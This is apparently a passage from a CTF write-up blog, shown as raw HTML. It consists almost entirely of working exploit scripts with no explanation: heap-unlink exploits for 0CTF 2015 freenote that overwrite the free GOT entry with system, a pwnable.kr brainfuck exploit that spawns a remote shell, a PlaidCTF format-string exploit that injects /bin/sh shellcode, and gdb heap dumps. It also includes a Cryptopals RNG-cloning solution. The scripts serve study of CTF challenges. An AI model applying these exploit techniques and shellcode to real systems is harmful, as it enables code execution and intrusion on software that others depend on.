class="line">io.read_until(&apos;e&apos;*0x8)</span><br><span class="line">heap_base = l64(io.read_until(&apos;\n&apos;).strip().ljust(8,&apos;\x00&apos;))</span><br><span class="line">io.read_until(&apos;f&apos;*0x8)</span><br><span class="line">libc_base = l64(io.read_until(&apos;\n&apos;).strip().ljust(8,&apos;\x00&apos;))</span><br><span class="line">Delete_Note(3)</span><br><span class="line">Delete_Note(2)</span><br><span class="line">Delete_Note(1)</span><br><span class="line">Delete_Note(0)</span><br><span class="line"></span><br><span class="line">system = libc_base + 0x7fde9b68f4f0 - 0x7fde9b9f1678</span><br><span class="line">bin_sh = libc_base + 0x7fde9b7af160 - 0x7fde9b9f1678</span><br><span class="line">heap = heap_base - 0x1940</span><br><span class="line">print hex(system)</span><br><span class="line">print hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd = heap + 0x30 - 0x8*3</span><br><span class="line">bk = heap + 0x30 - 0x8*2</span><br><span class="line">payload  = &apos;&apos;</span><br><span class="line">payload += l64(0) + l64(0x81)</span><br><span class="line">payload += l64(fd) + l64(bk)</span><br><span class="line">payload += &apos;A&apos;*(0x80-0x20)</span><br><span class="line">payload += l64(0x80) + l64(0x90)</span><br><span class="line">payload += &apos;B&apos;*0x80</span><br><span class="line">payload += l64(0) + l64(0x91)</span><br><span class="line">#payload += &apos;C&apos;*(0x20)</span><br><span class="line">print len(payload)</span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(1)</span><br><span class="line"></span><br><span class="line">free_got = 0x602018</span><br><span class="line">payload2  = &apos;&apos;</span><br><span class="line">payload2 += l64(3)</span><br><span class="line">payload2 += l64(1) + l64(8) + l64(bin_sh)</span><br><span class="line">payload2 += l64(1) + l64(8) + l64(free_got)</span><br><span class="line">payload2 += &apos;C&apos;*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(0,payload2)</span><br><span class="line">#List_Note()</span><br><span class="line">Edit_Note(1,l64(system))</span><br><span class="line">#List_Note()</span><br><span class="line">Delete_Note(0)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x86" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x86/" class="article-date">
  	<time datetime="2015-12-11T17:43:40.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x86/">0CTF-2015-Quals-freenote-x86</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x86">freenote_x86</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 10001</span><br><span class="line">target = (host,port)</span><br><span class="line">#target = &apos;./freenote_x86&apos;</span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=2333)#,print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line">def List_Note():</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def New_Note(note):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;2&apos;)</span><br><span class="line">    io.read_until(&apos;Length of new note: &apos;)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(&apos;Enter your note: &apos;)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line">def Edit_Note(num,note):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;3&apos;)</span><br><span class="line">    io.read_until(&apos;Note number: &apos;)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(&apos;Length of note: &apos;)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(&apos;Enter your note: &apos;)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line">def Delete_Note(num):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;4&apos;)</span><br><span class="line">    io.read_until(&apos;Note number: &apos;)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line">def Exit():</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">#io.gdb_hint([0x08048860])</span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">New_Note(&apos;a&apos;*0x10)</span><br><span class="line">New_Note(&apos;b&apos;*0x10)</span><br><span class="line">New_Note(&apos;c&apos;*0x10)</span><br><span class="line">New_Note(&apos;d&apos;*0x10)</span><br><span class="line">Delete_Note(0)</span><br><span class="line">Delete_Note(2)</span><br><span class="line">New_Note(&apos;e&apos;*0x4)</span><br><span class="line">New_Note(&apos;f&apos;*0x4)</span><br><span class="line">List_Note()</span><br><span class="line">io.read_until(&apos;eeee&apos;)</span><br><span class="line">heap_base = l32(io.read(4))</span><br><span class="line">io.read_until(&apos;ffff&apos;)</span><br><span class="line">libc_base = l32(io.read(4))</span><br><span class="line">Delete_Note(3)</span><br><span class="line">Delete_Note(2)</span><br><span class="line">Delete_Note(1)</span><br><span class="line">Delete_Note(0)</span><br><span class="line"></span><br><span class="line">system = libc_base + 0xf759a360 - 0xf7702450</span><br><span class="line">bin_sh = libc_base + 0xf76b91a9 - 0xf7702450</span><br><span class="line">heap = heap_base - 0xd28</span><br><span class="line">print hex(heap)</span><br><span class="line">List_Note()</span><br><span class="line"></span><br><span class="line">fd = heap + 0x18 - 0xc</span><br><span class="line">bk = heap + 0x18 - 0x8</span><br><span class="line">payload  = &apos;&apos;</span><br><span class="line">payload += l32(0) + l32(0x81)</span><br><span class="line">payload += l32(fd) + l32(bk)</span><br><span class="line">payload += &apos;A&apos;*(0x80-0x10)</span><br><span class="line">payload += l32(0x80) + l32(0x88)</span><br><span class="line">payload += &apos;B&apos;*0x80</span><br><span class="line">payload += l32(0) + l32(0x89) #+ &apos;C&apos;*0x60</span><br><span class="line">#Exit()</span><br><span class="line"></span><br><span class="line">New_Note(payload)</span><br><span class="line">Delete_Note(1)</span><br><span class="line"></span><br><span class="line">free_got = 0x0804a29c</span><br><span class="line">payload2  = &apos;&apos;</span><br><span class="line">payload2 += l32(3)</span><br><span class="line">payload2 += l32(1) + l32(4) + l32(bin_sh)</span><br><span class="line">payload2 += l32(1) + l32(4) + l32(free_got)</span><br><span class="line">payload2 += &apos;C&apos;*(len(payload)-len(payload2))</span><br><span class="line">Edit_Note(0,payload2)</span><br><span class="line">#List_Note()</span><br><span class="line">Edit_Note(1,l32(system))</span><br><span class="line">#List_Note()</span><br><span class="line">Delete_Note(0)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20wx 0x96cf000</span><br><span class="line">0x96cf000:	0x00000000	0x00000c19	0x00000100	0x00000003</span><br><span class="line">0x96cf010:	0x00000001	0x00000080	0x096cfc20	0x00000001</span><br><span class="line">0x96cf020:	0x00000080	0x096cfca8	0x00000001	0x00000080</span><br><span class="line">0x96cf030:	0x096cfd30	0x00000000	0x00000000	0x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/110wx 0x96cfc18</span><br><span class="line">0x96cfc18:	0x00000000	0x00000089	0x41414141	0x41414141</span><br><span class="line">0x96cfc28:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc38:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc48:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc58:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc68:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc78:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc88:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x96cfc98:	0x41414141	0x41414141	0x00000088	0x00000089</span><br><span class="line">0x96cfca8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcb8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcc8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcd8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfce8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcf8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd08:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd18:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd28:	0x00000000	0x00000089	0x43434343	0x43434343</span><br><span class="line">0x96cfd38:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd48:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd58:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd68:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd78:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd88:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfd98:	0x43434343	0x43434343	0x43434343	0x43434343</span><br><span class="line">0x96cfda8:	0x43434343	0x43434343	0x00000198	0x00020251</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/20wx 0x96cf000</span><br><span class="line">0x96cf000:	0x00000000	0x00000c19	0x00000100	0x00000001</span><br><span class="line">0x96cf010:	0x00000001	0x00000180	0x096cfc20	0x00000000</span><br><span class="line">0x96cf020:	0x00000000	0x096cfca8	0x00000000	0x00000000</span><br><span class="line">0x96cf030:	0x096cfd30	0x00000000	0x00000000	0x096cfdb8</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/110wx 0x96cfc18</span><br><span class="line">0x96cfc18:	0x00000000	0x00000189	0x00000000	0x00000081</span><br><span class="line">0x96cfc28:	0x096cf00c	0x096cf010	0x42424242	0x42424242</span><br><span class="line">0x96cfc38:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc48:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc58:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc68:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc78:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc88:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfc98:	0x42424242	0x42424242	0x00000080	0x00000088</span><br><span class="line">0x96cfca8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcb8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcc8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcd8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfce8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfcf8:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd08:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd18:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd28:	0x00000000	0x00000089	0x42424242	0x42424242</span><br><span class="line">0x96cfd38:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd48:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd58:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd68:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd78:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd88:	0x42424242	0x42424242	0x42424242	0x42424242</span><br><span class="line">0x96cfd98:	0x42424242	0x42424242	0x43434343	0x00020261</span><br><span class="line">0x96cfda8:	0x43434343	0x43434343	0x00000198	0x00020251</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Pwnable-kr-brainfuck" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/10/Pwnable-kr-brainfuck/" class="article-date">
  	<time datetime="2015-12-10T15:54:16.000Z" itemprop="datePublished">2015-12-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/10/Pwnable-kr-brainfuck/">Pwnable.kr-brainfuck</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/bf">bf</a> <a href="http://bigtang.org/files/bf_libc.so">bf_libc.so</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset_gets   = 0x66e50</span><br><span class="line">offset_fgets  = 0x65bc0</span><br><span class="line">offset_system = 0x3f250</span><br><span class="line">main = 0x08048671</span><br><span class="line"></span><br><span class="line">target = (&apos;pwnable.kr&apos;,9001) </span><br><span class="line">io = zio(target,timeout=100000,print_read=COLORED(REPR,&quot;yellow&quot;),\</span><br><span class="line">	print_write=COLORED(REPR,&quot;red&quot;))</span><br><span class="line">io.read_until(&apos;[ ]\n&apos;)</span><br><span class="line"></span><br><span class="line">payload  = &apos;&apos;</span><br><span class="line">payload += &apos;&lt;&apos;*(0xa0-0x10)</span><br><span class="line">payload += &apos;.&gt;.&gt;.&gt;.&apos;</span><br><span class="line">payload += &apos;&lt;&lt;&lt;&apos;</span><br><span class="line">payload += &apos;,&gt;,&gt;,&gt;,&gt;&apos;</span><br><span class="line">payload += &apos;&gt;&apos;*24</span><br><span class="line">payload += &apos;,&gt;,&gt;,&gt;,&gt;&apos;</span><br><span class="line">payload += &apos;,&gt;,&gt;,&gt;,&gt;.&apos;</span><br><span class="line"></span><br><span class="line">#io.gdb_hint([0x8048655])</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">fgets = l32(io.read(4))</span><br><span class="line">#print hex(fgets)</span><br><span class="line">system = fgets-offset_fgets+offset_system</span><br><span class="line">gets   = fgets-offset_fgets+offset_gets</span><br><span class="line"></span><br><span class="line">io.write(l32(system))</span><br><span class="line">io.write(l32(gets))</span><br><span class="line">io.write(l32(main))</span><br><span class="line">io.writeline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Clone-an-MT19937-RNG-from-its-output" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/" class="article-date">
  	<time datetime="2015-12-01T03:01:50.000Z" itemprop="datePublished">2015-12-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/01/Clone-an-MT19937-RNG-from-its-output/">Clone_an_MT19937_RNG_from_its_output</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Problem : <a href="http://cryptopals.com/sets/3/challenges/23/" target="_blank" rel="external">Clone_an_MT19937_RNG_from_its_output</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># Written against python 3.3.1</span><br><span class="line"># Matasano Problem 21,22</span><br><span class="line"># Implement the MT19937 Mersenne Twister RNG</span><br><span class="line"># generated from code on the wikipedia</span><br><span class="line"></span><br><span class="line">class MT19937:</span><br><span class="line">    def __init__(self, seed):</span><br><span class="line">        self.MT = [0] * 624;</span><br><span class="line">        self.index = 0;</span><br><span class="line">        self.seed = 0;</span><br><span class="line">        self.initialize_generator(seed);</span><br><span class="line"></span><br><span class="line">    def initialize_generator(self, seed):</span><br><span class="line">        i = 0;</span><br><span class="line">        self.MT[0] = seed;</span><br><span class="line">        for i in range(1, 624):</span><br><span class="line">            self.MT[i] = 0xffffffff &amp; (0x6c078965 * (self.MT[i-1] ^ (self.MT[i-1] &gt;&gt; 30)) + i);</span><br><span class="line">            </span><br><span class="line">    def extract_number(self):</span><br><span class="line">        if (self.index == 0):</span><br><span class="line">            self.generate_numbers();</span><br><span class="line">            </span><br><span class="line">        y = self.MT[self.index];        </span><br><span class="line">        y = y ^ (y &gt;&gt; 11);</span><br><span class="line">        y = y ^ ((y &lt;&lt; 7) &amp; 0x9d2c5680);</span><br><span class="line">        y = y ^ ((y &lt;&lt; 15) &amp; 0xefc60000);</span><br><span class="line">        y = y ^ (y &gt;&gt; 18);</span><br><span class="line">        </span><br><span class="line">        self.index = (self.index+1)%624</span><br><span class="line">        return y;</span><br><span class="line">            </span><br><span class="line">    def generate_numbers(self):</span><br><span class="line">        for i in range(624):</span><br><span class="line">            y = (self.MT[i] &amp; 0x80000000) + (self.MT[(i+1)%624] &amp; 0x7fffffff);</span><br><span class="line">            self.MT[i] = self.MT[(i+397)%624] ^ (y &gt;&gt; 1);</span><br><span class="line">            if ((y%2) != 0):</span><br><span class="line">                self.MT[i] = self.MT[i] ^ 0x9908b0df;</span><br><span class="line"></span><br><span class="line">def temper(y):</span><br><span class="line">    y = y ^ (y &gt;&gt; 11);</span><br><span class="line">    y = y ^ ((y &lt;&lt; 7) &amp; 0x9d2c5680);</span><br><span class="line">    y = y ^ ((y &lt;&lt; 15) &amp; 0xefc60000);</span><br><span class="line">    y = y ^ (y &gt;&gt; 18);</span><br><span class="line">    return y;</span><br><span class="line"></span><br><span class="line">def untemper(y):</span><br><span class="line">    y3 = (y &amp; 0xffffc000);</span><br><span class="line">    y3 |= ((y &gt;&gt; 18) ^ (y&amp;0x3fff));</span><br><span class="line">    y2 = (y3 &amp; 0x1039ffff);</span><br><span class="line">    y2 |= ((y3 ^ ((y2 &lt;&lt; 15) &amp; 0xefc60000)) &amp; 0xfffe0000);</span><br><span class="line">    y1 = y2 &amp; 0x7f;</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; 7) &amp; 0x9d2c5680) ^ y2) &amp; (0x7f &lt;&lt; 7));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; 7) &amp; 0x9d2c5680) ^ y2) &amp; (0x7f &lt;&lt; 14));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; 7) &amp; 0x9d2c5680) ^ y2) &amp; (0x7f &lt;&lt; 21));</span><br><span class="line">    y1 |= ((((y1 &lt;&lt; 7) &amp; 0x9d2c5680) ^ y2) &amp; 0xf0000000);</span><br><span class="line">    y0 = (y1 &amp; 0xffe00000);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; 11) ^ y1) &amp; 0x001ffc00);</span><br><span class="line">    y0 |= (((y0 &gt;&gt; 11) ^ y1) &amp; 0x3ff);</span><br><span class="line"></span><br><span class="line">    return y0;</span><br><span class="line"></span><br><span class="line">def cloneMT(dolly):</span><br><span class="line">    clone = MT19937(0);</span><br><span class="line">    for i in range(624):</span><br><span class="line">        clone.MT[i] = untemper(dolly.extract_number());</span><br><span class="line">    return clone;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    dolly = MT19937(8675309);</span><br><span class="line">    clone = cloneMT(dolly);</span><br><span class="line">    for i in range(100):</span><br><span class="line">        print(dolly.extract_number(),clone.extract_number());</span><br><span class="line">    print(&quot;Clone succeeded&quot;);</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-PlaidCTF-2015-Quals-ebp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/01/PlaidCTF-2015-Quals-ebp/" class="article-date">
  	<time datetime="2015-12-01T02:44:58.000Z" itemprop="datePublished">2015-12-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/01/PlaidCTF-2015-Quals-ebp/">PlaidCTF-2015-Quals-ebp</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf">ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php</span><br><span class="line">        &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f&quot;</span><br><span class="line">        &quot;\x73\x68\x68\x2f\x62\x69\x6e\x54&quot;</span><br><span class="line">        &quot;\x5b\x52\x53\x54\x59\x0f\x34&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = zio((&apos;127.0.0.1&apos;,2333),timeout=2333)</span><br><span class="line">#raw_input()</span><br><span class="line">io.writeline(&quot;%4$x&quot;)</span><br><span class="line">ebp = (int(io.read(8),16)-0x1c) &amp; 0xffff</span><br><span class="line">print &quot;[+] Leaked Address: &quot;, hex(ebp)</span><br><span class="line"></span><br><span class="line">io.writeline(&quot;%&quot;+str(ebp)+&quot;x%4$hn&quot;)</span><br><span class="line">io.writeline(shellcode+&quot;%&quot;+str(0xa480-len(shellcode))+&quot;x%&quot;+str(12)+&quot;$hn&quot;)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-RCTF-2015-Quals-pwn400" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/17/RCTF-2015-Quals-pwn400/" class="article-date">
  	<time datetime="2015-11-17T07:55:21.000Z" itemprop="datePublished">2015-11-17</time>
</a>
    </div>
  
  <div class="article-inner">
    
